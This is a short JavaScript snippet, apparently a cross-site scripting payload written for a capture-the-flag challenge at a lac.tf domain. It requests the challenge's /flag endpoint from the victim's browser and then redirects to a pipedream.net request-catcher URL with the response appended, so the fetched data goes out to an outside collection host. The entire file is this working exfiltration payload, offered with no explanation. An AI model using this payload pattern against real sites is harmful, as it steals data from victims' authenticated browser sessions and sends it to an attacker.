let xhr = new XMLHttpRequest();
xhr.open("POST", "https://california-state-police.lac.tf/flag");
xhr.setRequestHeader("Accept", "*/*");

xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    window.location="https://envjs5kxlmfl33f.m.pipedream.net?c="+xhr.responseText
  }};

xhr.send(null);
